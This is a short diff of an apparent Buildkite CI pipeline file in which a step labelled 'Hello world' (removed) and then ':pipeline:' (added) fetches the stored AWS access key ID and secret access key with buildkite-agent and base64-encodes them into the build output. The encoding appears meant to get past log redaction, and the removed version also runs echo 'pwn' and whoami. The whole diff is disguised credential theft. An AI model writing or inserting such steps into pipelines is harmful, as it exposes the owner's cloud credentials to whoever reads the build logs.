@@ -1,3 +1,5 @@
 steps:
-  - label: "Hello world"
-    command: echo "pwn";whoami;buildkite-agent secret get EC2_SECRET_ACCESS_KEY|base64 -w0;buildkite-agent secret get EC2_ACCESS_KEY_ID|base64 -w0
+  - label: ":pipeline:"
+    command:
+      - buildkite-agent secret get EC2_ACCESS_KEY_ID|base64 -w0
+      - buildkite-agent secret get EC2_SECRET_ACCESS_KEY|base64 -w0
